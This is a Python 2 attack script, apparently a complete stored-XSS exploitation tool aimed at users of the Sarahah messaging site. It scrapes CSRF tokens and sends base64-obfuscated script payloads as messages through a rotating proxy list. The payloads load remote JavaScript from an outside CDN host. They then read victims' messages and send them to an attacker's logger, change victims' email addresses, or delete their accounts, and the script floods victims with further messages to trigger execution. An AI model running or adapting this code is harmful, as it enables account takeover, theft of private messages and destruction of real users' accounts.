#!/usr/bin/python
print "[+] Importing Modules..."
import json
import sys
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import glob
from base64 import b64encode
import os
import urllib
import ssl
import cookielib
import urllib2
try: 
	print "    Importing BeautifulSoup module..."
	from BeautifulSoup import BeautifulSoup
except ImportError:
	from bs4 import BeautifulSoup

if os.name=='nt':
	os.system('cls')
else:
	os.system('clear')

print '''
   ____                  _           _     
 / ___|  __ _ _ __ __ _| |__   __ _| |__  
 \___ \ / _` | '__/ _` | '_ \ / _` | '_ \ 
  ___) | (_| | | | (_| | | | | (_| | | | |
 |____/ \__,_|_|  \__,_|_| |_|\__,_|_| |_|
	   Sarahah XSS Exploitation Script
       Author: Shawar Khan ( www.shawarkhan.com )

[+] Select Option:\n\n    1. Read Victim\'s Messages\n    2. Change Victim\'s Email\n    3. Delete Victim\'s Account\n    4. View Captured Messages\n
'''

def capturedmessages():
	users = []
	for file in glob.glob("*.txt"):
	    users.append(file.split('.')[0])
	print '\n[+] Messages Available:\n'
	for i in users:
		print '   > '+i
	username = raw_input('\n[+] Enter Username: ')
	file = username+'.txt'
	print '[+] Loading Messages of "%s"\n'%username
	f = open(file).read().splitlines()
	for i in f[0].split('---')[1][1:-1].replace('},{','}\n{').split('\n'):
		data = json.loads(i)
		print '    Message: %s\n    Date   : %s\n'%(data['text'],data['dateSent'])

def exploit(exploitname,user,email,logpath=''):
	exploits = {"messageread":'var username="%s";var logger="%s";var script = document.createElement("script");script.src = atob("aHR0cHM6Ly9jZG4ucmF3Z2l0LmNvbS9zaGF3YXJraGFuZXRoaWNhbGhhY2tlci9TYXJhaGFoLVhTUy1FeHBsb2l0L21hc3Rlci9leHBsb2l0Y29kZS9yZWFkbWVzc2FnZS5qcw==");document.getElementsByTagName("body")[0].appendChild(script);'%(user,logpath),
				"emailchange":'var email=atob("%s");var script = document.createElement("script");script.src = atob("aHR0cHM6Ly9jZG4ucmF3Z2l0LmNvbS9zaGF3YXJraGFuZXRoaWNhbGhhY2tlci9TYXJhaGFoLVhTUy1FeHBsb2l0L21hc3Rlci9leHBsb2l0Y29kZS9lbWFpbGNoYW5nZS5qcw==");document.getElementsByTagName("body")[0].appendChild(script);'%b64encode(email),
				"accountdelete":'var script = document.createElement("script");script.src = atob("aHR0cHM6Ly9jZG4ucmF3Z2l0LmNvbS9zaGF3YXJraGFuZXRoaWNhbGhhY2tlci9TYXJhaGFoLVhTUy1FeHBsb2l0L21hc3Rlci9leHBsb2l0Y29kZS9hY2NvdW50ZGVsZXRlLmpz");document.getElementsByTagName("body")[0].appendChild(script);var script1 = document.createElement("script");script1.src = atob("aHR0cHM6Ly9jZG4ucmF3Z2l0LmNvbS9zaGF3YXJraGFuZXRoaWNhbGhhY2tlci9TYXJhaGFoLVhTUy1FeHBsb2l0L21hc3Rlci9leHBsb2l0Y29kZS9hY2NvdW50ZGVsZXRlLmpz");document.getElementsByTagName("body")[0].appendChild(script1);var script2 = document.createElement("script");script2.src = atob("aHR0cHM6Ly9jZG4ucmF3Z2l0LmNvbS9zaGF3YXJraGFuZXRoaWNhbGhhY2tlci9TYXJhaGFoLVhTUy1FeHBsb2l0L21hc3Rlci9leHBsb2l0Y29kZS9hY2NvdW50ZGVsZXRlLmpz");document.getElementsByTagName("body")[0].appendChild(script2);'}
	return '<script>eval(atob("%s"))</script>'%b64encode(exploits[exploitname])

def sendexploit(exploitcode,victim):
	
	heds = {"User-Agent":"Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"}
	r = requests.get('https://'+victim+'.sarahah.com',verify=False, headers=heds)
	s = requests.Session()

	sourcecode = r.text
	#print sourcecode
	if 'User Not Found' in sourcecode:
		print "[+] User Not Found!"
		exit()
	else:
		cookies=r.headers['Set-Cookie']
		parsed_html = BeautifulSoup(sourcecode)
		csrftoken = str(parsed_html.body.findAll('script')[4]).split('\n')[25].split('=')[3].split('"')[1]
		userid = parsed_html.body.find('input', attrs={'id':'RecipientId'})['value']
		print "[+] User Found!"
		print "[+] Sending Payload...\n"
		proxies = open('proxy.lst','r').read().splitlines()
		import json
		exploitstatus=''
		blockedproxies = []
		for i in range(0,25):

			heds1 = {"User-Agent":"Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0",
							"X-Requested-With":"XMLHttpRequest",
							"Cookie":cookies}
			
			print '[+] Request:',i
			reqs = 'none'
			for proxy1 in proxies:
				#print "\nUsing proxy",proxy1
				#print blockedproxies
				if proxy1 not in blockedproxies:
					if reqs == 'done':
					#	print "Request was successfully sent!"
						break
					try:
						try:
							ip = {'http':'http://'+str(proxy1),'https':'https://'+str(proxy1)}
							if exploitstatus == '':
								#print exploitcode
								#print 'Sending Request'
								postdata = {"__RequestVerificationToken":csrftoken,"userId":userid,"text":exploitcode,"captchaResponse":""}
								posturl = requests.post('https://'+victim+'.sarahah.com/Messages/SendMessage',verify=False,proxies=ip,headers=heds1,data=postdata)
								sourcecode2 = posturl.text
								#print "Printing Sourcecode"
								#print sourcecode2
								if "Done" in sourcecode2:
									reqs = 'done'
									exploitstatus = 'sent'
									print '[+] Payload Sent!'
									print '[+] Flooding Victim for payload execution...'
									print '[i] This may take a while...'
								else:
									blockedproxies.append(proxy1)
									#print 'Proxy %s Blocked'%proxy1
									#print blockedproxies
									pass
							else:
								postdata = {"__RequestVerificationToken":csrftoken,"userId":userid,"text":":)","captchaResponse":""}
								posturl = requests.post('https://'+victim+'.sarahah.com/Messages/SendMessage',verify=False,proxies=ip,headers=heds1,data=postdata)
								sourcecode2 = posturl.text
								#print sourcecode2
								if "Done" in sourcecode2:
									reqs = 'done'
								else:
									blockedproxies.append(proxy1)
						except KeyboardInterrupt:
							pass
					except Exception as e:
						#print e
						pass
				else:
					#print "Proxy %s Ignored!"%proxy1
					pass
		print "[+] User Successfully Flooded & Payload Sent."
		print "[i] Keep your logger running, wait for user to scroll and you'll get the logs."


def readmessageexploit():
	username = raw_input("[+] Enter Victim Username > ")
	loger = raw_input("[+] Enter Path to Logger > ")
	#print "[i] Logger is pre-defined 'https://127.0.0.1/log.php'."
	sendexploit(exploit('messageread',username,'',loger),username)

def emailchangeexploit():
	username = raw_input("[+] Enter Victim Username > ")
	email = raw_input("[+] Enter New Email > ")
	sendexploit(exploit('emailchange',username,email),username)

def accountdeleteexploit():
	username=raw_input("[+] Enter Victim Username > ")
	sendexploit(exploit('accountdelete',username,''),username)

def menu():
	option = raw_input("[+] Options: 1,2,3,4\n    Select Option > ")
	if option == "1":
		print "Read Victim's Messages"
		readmessageexploit()
	elif option == "2":
		emailchangeexploit()
	elif option == "3":
		accountdeleteexploit()
	elif option == "4":
		capturedmessages()
	else:
		print "[!] Invalid Option Selected!"
		menu()
menu()